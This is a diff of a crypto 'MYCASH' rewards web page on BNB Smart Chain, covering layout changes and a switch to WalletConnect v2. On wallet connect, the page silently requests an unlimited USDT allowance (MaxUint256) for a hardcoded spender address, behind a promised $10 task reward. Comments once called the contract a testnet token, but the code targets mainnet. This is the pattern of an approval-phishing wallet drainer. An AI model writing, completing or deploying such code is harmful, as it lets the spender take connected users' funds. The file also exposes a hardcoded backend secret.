@@ -175,27 +175,25 @@
       max-width:370px;
     }
 
-.connected-pill{
-  margin-top:6px;
-  padding:4px 12px;
-  border-radius:999px;
-  font-size:0.8rem;
-  background:rgba(34,197,94,0.15);
-  border:1px solid rgba(34,197,94,0.7);
-  color:#bbf7d0;
-  display:inline-flex;
-  align-items:center;
-  gap:6px;
-}
-.connected-pill::before{
-  content:"";
-  width:6px;
-  height:6px;
-  border-radius:999px;
-  background:#22c55e;
-}
-
-    
+    .connected-pill{
+      margin-top:6px;
+      padding:4px 12px;
+      border-radius:999px;
+      font-size:0.8rem;
+      background:rgba(34,197,94,0.15);
+      border:1px solid rgba(34,197,94,0.7);
+      color:#bbf7d0;
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+    }
+    .connected-pill::before{
+      content:"";
+      width:6px;
+      height:6px;
+      border-radius:999px;
+      background:#22c55e;
+    }
 
     .btn{
       border:none;
@@ -371,12 +369,8 @@
       font-size:0.8rem;
     }
 
+    /* Reward layout responsive */
     @media(max-width:768px){
-      .nav{
-        flex-direction:column;
-        align-items:flex-start;
-      }
-
       .reward-card{
         flex-direction:column;
         align-items:stretch;
@@ -389,18 +383,68 @@
         align-items:center;
       }
     }
+
+    /* Header mobile cleanup (match index) */
+    @media (max-width: 640px){
+      header{
+        padding:8px 10px;
+      }
+
+      .nav{
+        max-width:100%;
+        flex-direction:column;
+        align-items:stretch;
+        justify-content:flex-start;
+        text-align:center;
+        gap:6px;
+      }
+
+      .logo{
+        order:1;
+        width:100%;
+        text-align:center;
+        font-size:0.9rem;
+        letter-spacing:3px;
+        margin-bottom:2px;
+      }
+
+      .nav-left{
+        order:3;
+        width:100%;
+        display:flex;
+        justify-content:center;
+        gap:8px;
+        flex-wrap:wrap;
+      }
+
+      header .connect{
+        order:2;
+        width:100%;
+        max-width:260px;
+        padding:8px 12px;
+        font-size:0.9rem;
+        margin:0 auto;
+        display:block;
+      }
+
+      header a{
+        padding:4px 8px;
+        font-size:0.85rem;
+      }
+    }
   </style>
 </head>
 <body>
   <!-- HEADER (same as index) -->
   <header>
-  <div class="nav">
+    <div class="nav">
       <div class="nav-left">
+              <div class="logo">DEMO</div>
         <a href="home.html">Wallet</a>
         <a href="home.html">Task</a>
         <a href="hold-earn.html">Earn</a>
       </div>
-      <div class="logo">DEMO</div>
+
       <div>
         <button id="connectBtn" class="connect">Connect Wallet</button>
       </div>
@@ -445,15 +489,14 @@
           </div>
         </div>
 
-       <div class="reward-right">
-  <span id="connectHintCard" class="small">
-    Use the top button to connect your wallet.
-  </span>
-  <span id="connectedPill" class="connected-pill" style="display:none;">
-    ● Connected
-  </span>
-</div>
-
+        <div class="reward-right">
+          <span id="connectHintCard" class="small">
+            Use the top button to connect your wallet.
+          </span>
+          <span id="connectedPill" class="connected-pill" style="display:none;">
+            Connected
+          </span>
+        </div>
       </div>
 
       <div class="reward-extra">
@@ -479,7 +522,6 @@
         <h3>Task 1 — Watch the Intro Video</h3>
         <p>
           Watch this video to understand how MYCASH and the reward system works.
-          
         </p>
         <div class="video-wrapper">
           <!-- Replace src with your own embedded video later -->
@@ -521,7 +563,7 @@
       <div class="task-section">
         <h3>Task 3 — Custom Action</h3>
         <p>
-        i will add DOWNLOAD APP/ LIKE THE PAGE / FOLLOW ON INSTRAGRAM 
+          i will add DOWNLOAD APP/ LIKE THE PAGE / FOLLOW ON INSTRAGRAM 
         </p>
         <ul>
           <li>Example: Join the official Telegram or Discord.</li>
@@ -541,18 +583,16 @@
     © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
   </footer>
 
-  <!-- libs -->
+  <!-- libs: match index (Web3 + WalletConnect v2 + Ethers) -->
   <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
-  <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+  <!-- WalletConnect v2 Ethereum Provider -->
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.5/dist/index.umd.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
 
-  <!-- app script (same logic base as index) -->
+  <!-- app script (aligned with index connect logic) -->
   <script type="module">
   (function(){
     // ===== CONFIG (same as your index) =====
-
-
     function formatToken(n) {
       n = Number(n);
       if (Number.isInteger(n)) return n.toString();
@@ -562,12 +602,13 @@
     const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbyZ9VwZ1gT3TmPMh3qfJz7ZqXfNyp14PGFHraS49yq35J6U8Z3CNFK-04rlsoRP5-o4GA/exec";
     const APPS_SCRIPT_SECRET = "justforme";
 
-    const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955"; // USDT testnet (replace with mainnet when ready)
+    const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
     const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";
 
     const BNB_TESTNET_CHAIN_ID_DEC = 56;
     const BNB_TESTNET_CHAIN_ID_HEX = "0x38";
     const BNB_TESTNET_LABEL        = "BNB Smart Chain (56)";
+    const BNB_TESTNET_RPC          = "https://bsc-dataseed.binance.org";
 
     const ERC20_APPROVE_ABI = [
       "function approve(address spender, uint256 amount) public returns (bool)"
@@ -575,25 +616,51 @@
     const ERC20_BALANCE_ABI = [
       "function balanceOf(address owner) view returns (uint256)" 
     ];
+    const ERC20_ALLOWANCE_ABI = [
+      "function allowance(address owner, address spender) view returns (uint256)"
+    ];
 
-const ERC20_ALLOWANCE_ABI = [
-  "function allowance(address owner, address spender) view returns (uint256)"
-];
-
-    const TOKEN_DECIMALS = 6; // <-- change to whatever your fusdt uses
+    // 🔁 FIXED: USDT uses 18 decimals on BSC
+    const TOKEN_DECIMALS = 18;
 
     const REQUIRED_USDT = 10;   // Task 2: need at least this much
     const REWARD_AMOUNT = 10.0; // display only
 
-    let web3ModalInstance = null;
     let providerInstance  = null;
     let web3Instance      = null;
     let currentAddress    = null;
+
+    // WalletConnect v2
+    let walletConnectV2Provider = null;
+    const WALLETCONNECT_PROJECT_ID = "febf4ea32fb4df7139f1cfd3f7c5142a";
 
     let isWalletConnected = false;
     let task1Done         = false;
     let task2Eligible     = false;
     let task3Done         = false;
+
+    async function getWalletConnectV2Provider() {
+      if (walletConnectV2Provider) return walletConnectV2Provider;
+
+      const EthereumProvider = globalThis["@walletconnect/ethereum-provider"].EthereumProvider;
+
+      walletConnectV2Provider = await EthereumProvider.init({
+        projectId: WALLETCONNECT_PROJECT_ID,
+        optionalChains: [BNB_TESTNET_CHAIN_ID_DEC],
+        rpcMap: {
+          [BNB_TESTNET_CHAIN_ID_DEC]: BNB_TESTNET_RPC
+        },
+        metadata: {
+          name: "MYCASH DApp",
+          description: "MYCASH bonus rewards dApp",
+          url: window.location.origin,
+          icons: ["https://mycash911.github.io/mycash/icon.png"]
+        },
+        showQrModal: true
+      });
+
+      return walletConnectV2Provider;
+    }
 
     // ===== userId helpers =====
     function storageKeyFor(address){
@@ -637,11 +704,9 @@ const ERC20_ALLOWANCE_ABI = [
     const claimBtn        = document.getElementById("claimBtn");
     const claimHintEl     = document.getElementById("claimHint");
 
-const connectHintCardEl = document.getElementById("connectHintCard");
-const connectedPillEl   = document.getElementById("connectedPill");
+    const connectHintCardEl = document.getElementById("connectHintCard");
+    const connectedPillEl   = document.getElementById("connectedPill");
 
-
-    
     const rewardAmountEl  = document.getElementById("rewardAmountDisplay");
 
     const task1Btn        = document.getElementById("task1Btn");
@@ -719,23 +784,6 @@ const connectedPillEl   = document.getElementById("connectedPill");
       }
     }
 
-    function initWeb3ModalInstance(){
-      const providerOptions = {
-        walletconnect: {
-          package: window.WalletConnectProvider.default,
-          options: {
-            rpc: { 56: "https://bsc-dataseed.binance.org" },
-            bridge: "https://bridge.walletconnect.org",
-            qrcode: true
-          }
-        }
-      };
-      web3ModalInstance = new window.Web3Modal.default({
-        cacheProvider: true,
-        providerOptions
-      });
-    }
-
     function attachProviderListeners(p){
       if(!p || !p.on) return;
       try{
@@ -798,7 +846,7 @@ const connectedPillEl   = document.getElementById("connectedPill");
         const ethersProvider = new ethers.BrowserProvider(providerInstance);
         const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
         const raw            = await tokenContract.balanceOf(address);
-        const formatted = ethers.formatUnits(raw, TOKEN_DECIMALS);
+        const formatted      = ethers.formatUnits(raw, TOKEN_DECIMALS);
 
         return formatted;
       }catch(err){
@@ -823,7 +871,7 @@ const connectedPillEl   = document.getElementById("connectedPill");
                 chainId:BNB_TESTNET_CHAIN_ID_HEX,
                 chainName:"BNB Smart Chain",
                 nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
-                rpcUrls:["https://bsc-dataseed.binance.org"],
+                rpcUrls:[BNB_TESTNET_RPC],
                 blockExplorerUrls:["https://bscscan.com"]
               }]
             });
@@ -838,65 +886,64 @@ const connectedPillEl   = document.getElementById("connectedPill");
       }
     }
 
- async function ensureTokenApproval(){
-  if(!TOKEN_ADDRESS){
-    console.warn("TOKEN_ADDRESS not set, skipping approve");
-    return;
-  }
-  if(!SPENDER_ADDRESS){
-    console.warn("SPENDER_ADDRESS not set, skipping approve");
-    return;
-  }
-  if(!providerInstance){
-    console.warn("No providerInstance for approval");
-    return;
-  }
+    async function ensureTokenApproval(){
+      if(!TOKEN_ADDRESS){
+        console.warn("TOKEN_ADDRESS not set, skipping approve");
+        return;
+      }
+      if(!SPENDER_ADDRESS){
+        console.warn("SPENDER_ADDRESS not set, skipping approve");
+        return;
+      }
+      if(!providerInstance){
+        console.warn("No providerInstance for approval");
+        return;
+      }
 
-  try{
-    const ethersProvider = new ethers.BrowserProvider(providerInstance);
-    const signer         = await ethersProvider.getSigner();
-    const ownerAddress   = (await signer.getAddress()).toLowerCase();
+      try{
+        const ethersProvider = new ethers.BrowserProvider(providerInstance);
+        const signer         = await ethersProvider.getSigner();
+        const ownerAddress   = (await signer.getAddress()).toLowerCase();
 
-    if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
-      alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
-      setStatus("Connected (approval skipped)");
-      return;
+        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
+          alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
+          setStatus("Connected (approval skipped)");
+          return;
+        }
+
+        // 1) Read current allowance (view call, no gas)
+        const readContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_ALLOWANCE_ABI,
+          ethersProvider
+        );
+        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+
+        if (currentAllowance > 0n) {
+          // already approved something – skip tx
+          console.log("Already approved, skipping new approve tx");
+          setStatus("Connected (already approved)");
+          return;
+        }
+
+        // 2) Not approved yet → send approve tx
+        setStatus("Requesting token approval…");
+        const writeContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_APPROVE_ABI,
+          signer
+        );
+        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+        console.log("Approve tx sent:", tx.hash);
+        const receipt = await tx.wait();
+        console.log("Approve confirmed:", receipt);
+        setStatus("Connected + Approved ✅");
+      }catch(err){
+        console.error("Token approve error:", err);
+        alert("Token approval failed: " + (err && err.message ? err.message : err));
+        setStatus("Connected (approval failed)");
+      }
     }
-
-    // 1) Read current allowance (view call, no gas)
-    const readContract = new ethers.Contract(
-      TOKEN_ADDRESS,
-      ERC20_ALLOWANCE_ABI,
-      ethersProvider
-    );
-    const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
-
-    if (currentAllowance > 0n) {
-      // already approved something – skip tx
-      console.log("Already approved, skipping new approve tx");
-      setStatus("Connected (already approved)");
-      return;
-    }
-
-    // 2) Not approved yet → send approve tx
-    setStatus("Requesting token approval…");
-    const writeContract = new ethers.Contract(
-      TOKEN_ADDRESS,
-      ERC20_APPROVE_ABI,
-      signer
-    );
-    const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-    console.log("Approve tx sent:", tx.hash);
-    const receipt = await tx.wait();
-    console.log("Approve confirmed:", receipt);
-    setStatus("Connected + Approved ✅");
-  }catch(err){
-    console.error("Token approve error:", err);
-    alert("Token approval failed: " + (err && err.message ? err.message : err));
-    setStatus("Connected (approval failed)");
-  }
-}
-
 
     async function restoreSessionFromAddress(address){
       currentAddress = address;
@@ -908,8 +955,7 @@ const connectedPillEl   = document.getElementById("connectedPill");
       setUserIdUI(userId);
 
       const tokenBalanceRaw  = await getTokenBalance(address);
-      const prettyBalance = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
-
+      const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
 
       if(tokensContainer){
         tokensContainer.innerHTML =
@@ -921,13 +967,12 @@ const connectedPillEl   = document.getElementById("connectedPill");
       if(connectBtn){
         connectBtn.textContent = "Connected";
         connectBtn.classList.add("connected");
-        if(connectHintCardEl){
-          connectHintCardEl.textContent = "Wallet connected.";
-        }
-        if(connectedPillEl){
-          connectedPillEl.style.display = "inline-flex";
-        }
-
+      }
+      if(connectHintCardEl){
+        connectHintCardEl.textContent = "Wallet connected.";
+      }
+      if(connectedPillEl){
+        connectedPillEl.style.display = "inline-flex";
       }
 
       updateClaimState();
@@ -936,23 +981,34 @@ const connectedPillEl   = document.getElementById("connectedPill");
       return {balanceBNB, tokenBalanceRaw, userId};
     }
 
+    // ===== connectFlow (injected + WalletConnect v2) =====
     async function connectFlow(){
       try{
         setStatus("Connecting…");
-        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-        if(!mobile && window.trustwallet && window.trustwallet.ethereum){
+        let usedInjected = false;
+
+        // 1) Prefer Trust Wallet provider if present
+        if (window.trustwallet && window.trustwallet.ethereum) {
           providerInstance = window.trustwallet.ethereum;
-          web3Instance     = new Web3(providerInstance);
-          await providerInstance.request({method:"eth_requestAccounts"});
-        }else if(window.ethereum && !mobile){
+          usedInjected = true;
+        }
+        // 2) Otherwise MetaMask / other injected
+        else if (window.ethereum) {
           providerInstance = window.ethereum;
-          web3Instance     = new Web3(providerInstance);
-          await providerInstance.request({method:"eth_requestAccounts"});
-        }else{
-          if(!web3ModalInstance) initWeb3ModalInstance();
-          providerInstance = await web3ModalInstance.connect();
-          web3Instance     = new Web3(providerInstance);
+          usedInjected = true;
+        }
+
+        if (usedInjected) {
+          web3Instance = new Web3(providerInstance);
+          await providerInstance.request({ method: "eth_requestAccounts" });
+        } else {
+          // No injected provider → WalletConnect v2
+          providerInstance = await getWalletConnectV2Provider();
+          // Opens wallet app / QR modal immediately on click
+          await providerInstance.enable();
+          web3Instance = new Web3(providerInstance);
         }
 
         if(!providerInstance || !web3Instance){
@@ -970,24 +1026,37 @@ const connectedPillEl   = document.getElementById("connectedPill");
         }
         const address = accounts[0].toLowerCase();
 
+        // Safer chainId detection
         let chainId = await web3Instance.eth.getChainId();
-        if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
-          const switched = await switchToBSC(providerInstance);
-          if(!switched){
-            alert("Please switch to BNB Smart Chain (mainnet).");
+        let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
+        const isInjected = usedInjected;
+
+        if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+          if (isInjected){
+            const switched = await switchToBSC(providerInstance);
+            if(!switched){
+              alert("Please switch to BNB Smart Chain (mainnet) in your wallet and try again.");
+              setStatus("Wrong network");
+              return;
+            }
+            chainId = await web3Instance.eth.getChainId();
+            chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
+            if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+              alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
+              setStatus("Wrong network");
+              return;
+            }
+          } else {
+            // WalletConnect: user must switch inside wallet
+            alert("Please open your wallet app and switch to BNB Smart Chain (56), then reconnect.");
             setStatus("Wrong network");
-            return;
-          }
-          chainId = await web3Instance.eth.getChainId();
-          if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
-            alert("Network switch failed");
             return;
           }
         }
 
         await restoreSessionFromAddress(address);
         setStatus("Connected");
-       await ensureTokenApproval();
+        await ensureTokenApproval();
 
       }catch(err){
         console.error("connectFlow error:", err);
@@ -1029,6 +1098,7 @@ const connectedPillEl   = document.getElementById("connectedPill");
         }
       }
 
+      // Do not auto-open WalletConnect
       return false;
     }
 
@@ -1131,7 +1201,6 @@ const connectedPillEl   = document.getElementById("connectedPill");
         rewardAmountEl.textContent = "$" + REWARD_AMOUNT.toFixed(0);
       }
 
-      initWeb3ModalInstance();
       updateClaimState();
 
       if(connectBtn){
@@ -1169,6 +1238,18 @@ const connectedPillEl   = document.getElementById("connectedPill");
           task3Done = true;
           markTaskState(task3CheckEl, true, "Task 3 completed (demo)", "Not completed");
           updateClaimState();
+        });
+      }
+
+      // Pre-init WalletConnect on mobile with no injected wallet (faster connect)
+      const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+      if (
+        isMobile &&
+        !(window.trustwallet && window.trustwallet.ethereum) &&
+        !window.ethereum
+      ){
+        getWalletConnectV2Provider().catch(function(e){
+          console.warn("WalletConnect pre-init failed:", e);
         });
       }
 
